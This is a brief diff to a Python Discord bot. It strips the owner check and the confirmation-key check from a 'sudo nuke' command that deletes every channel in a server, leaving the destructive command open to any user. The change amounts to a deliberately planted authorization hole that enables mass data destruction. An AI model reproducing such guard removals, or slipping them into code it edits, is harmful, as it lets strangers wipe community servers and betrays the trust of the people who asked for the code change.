@@ -49,11 +49,6 @@ async def sudo(ctx):
 # ================= NUKE =================
 @sudo.command(name="nuke")
 async def sudo_nuke(ctx, key: str = None):
-    if not is_owner(ctx):
-        return
-    if key != "now":
-        return
-
     for channel in list(ctx.guild.channels):
         try:
             await channel.delete(reason="sudo nuke")
@@ -129,3 +124,4 @@ if not TOKEN:
 
 time.sleep(10)  # prevent Railway reconnect spam
 bot.run(TOKEN)
+
